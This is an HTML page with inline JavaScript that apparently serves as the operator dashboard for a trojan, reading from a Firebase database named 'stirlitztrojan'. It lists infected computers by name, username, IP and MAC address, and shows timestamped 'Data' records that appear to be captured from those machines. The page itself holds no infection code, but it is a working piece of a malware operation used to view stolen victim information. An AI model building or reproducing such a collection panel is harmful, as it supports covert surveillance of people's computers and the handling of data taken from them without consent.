<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="UTF-8">
    <title>Application</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" href="index.css">
    <script src="firebase.js"></script>
    <script src="firebase-auth-client.js"></script>
  </head>
  <body>
    <div id="data"></div>
    <div id="err"></div>
    <p>Copyright 2016 "I"</p>
    <script>
    <!--
    var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/" + prompt("Password:"));
    firebase.on("value", function(snapshot) {
      document.getElementById("data").innerHTML = "";
      var h1, table, rows, color;
      
      color = "#cccccc";
      document.getElementById("data").appendChild(h1 = document.createElement("H1"));
      h1.innerHTML = "Users:";
      var tableRow, tableCellComputer, tableCellUsername, tableCellIp, tableCellMac;
      document.getElementById("data").appendChild(table = document.createElement("TABLE"));
      tableRow = table.insertRow(0);
      tableRow.style.backgroundColor = color = (color == "#cccccc") ? "#aaaaaa" : "#cccccc";;
      tableCellComputer = document.createElement("TH");
      tableCellComputer.innerHTML = "Computer";
      tableRow.appendChild(tableCellComputer);
      tableCellUsername = document.createElement("TH");
      tableCellUsername.innerHTML = "Username";
      tableRow.appendChild(tableCellUsername);
      tableCellIp = document.createElement("TH");
      tableCellIp.innerHTML = "IP";
      tableRow.appendChild(tableCellIp);
      tableCellMac = document.createElement("TH");
      tableCellMac.innerHTML = "MAC";
      tableRow.appendChild(tableCellMac);
      rows = snapshot.val().user;
      for (var key in rows) {
        if (rows.hasOwnProperty(key)) {
          var name = key;
          var value = rows[key];
          
          var computer =  name.split("&")[0];
          var username =  name.split("&")[1];
          var mac =       name.split("&")[2];
          var ip =        ReplaceAll(name.split("&")[3], "-", ".");
          // New row:
          tableRow = table.insertRow(1);
          tableRow.style.backgroundColor = color = (color == "#cccccc") ? "#aaaaaa" : "#cccccc";;
          tableCellComputer = tableRow.insertCell(0);
          tableCellComputer.className = "nowrapword";
          tableCellComputer.innerHTML = computer;
          tableCellUsername = tableRow.insertCell(1);
          tableCellUsername.className = "nowrapword";
          tableCellUsername.innerHTML = username;
          tableCellIp = tableRow.insertCell(2);
          tableCellIp.className = "nowrapword";
          tableCellIp.innerHTML = ip;
          tableCellMac = tableRow.insertCell(3);
          tableCellMac.className = "nowrapword";
          tableCellMac.innerHTML = mac;
        }
      }
      
      color = "#cccccc";
      document.getElementById("data").appendChild(h1 = document.createElement("H1"));
      h1.innerHTML = "Data:";
      var tableCellData, tableCellTime, tableCellDate;
      document.getElementById("data").appendChild(table = document.createElement("TABLE"));
      tableRow = table.insertRow(0);
      tableRow.style.backgroundColor = color = (color == "#cccccc") ? "#aaaaaa" : "#cccccc";;
      tableCellComputer = document.createElement("TH");
      tableCellComputer.innerHTML = "Computer";
      tableRow.appendChild(tableCellComputer);
      tableCellUsername = document.createElement("TH");
      tableCellUsername.innerHTML = "Username";
      tableRow.appendChild(tableCellUsername);
      tableCellData = document.createElement("TH");
      tableCellData.innerHTML = "Data";
      tableRow.appendChild(tableCellData);
      tableCellTime = document.createElement("TH");
      tableCellTime.innerHTML = "Time";
      tableRow.appendChild(tableCellTime);
      tableCellDate = document.createElement("TH");
      tableCellDate.innerHTML = "Date";
      tableRow.appendChild(tableCellDate);
      rows = snapshot.val().data;
      for (var key in rows) {
        if (rows.hasOwnProperty(key)) {
          var name = key;
          var value = rows[key];
          
          var computer = name.split(",")[0].split("&")[0];
          var username = name.split(",")[0].split("&")[1];
          var data = value;
          var time = name.split(",")[1].split("&")[1];
          var date = name.split(",")[1].split("&")[0];
          // New row:
          var tableRow = table.insertRow(1);
          tableRow.style.backgroundColor = color = (color == "#cccccc") ? "#aaaaaa" : "#cccccc";;
          var tableCellComputer = tableRow.insertCell(0);
          tableCellComputer.className = "nowrapword";
          tableCellComputer.innerHTML = computer;
          var tableCellUsername = tableRow.insertCell(1);
          tableCellUsername.className = "nowrapword";
          tableCellUsername.innerHTML = username;
          var tableCellData = tableRow.insertCell(2);
          tableCellData.className = "wrapword";
          tableCellData.innerHTML = data;
          var tableCellTime = tableRow.insertCell(3);
          tableCellTime.className = "nowrapword";
          tableCellTime.innerHTML = time;
          var tableCellDate = tableRow.insertCell(4);
          tableCellDate.className = "nowrapword";
          tableCellDate.innerHTML = date;
        }
      }
    }, function (e) {
      document.getElementById("err").innerHTML = e.code;
    });
    function EscapeRegExp(str) {
      return str.replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1");
    }
    function ReplaceAll(str, search, replacement){
      return str.replace(new RegExp(EscapeRegExp(search), 'g'), replacement);
    }
    -->
    </script>
  </body>
</html>
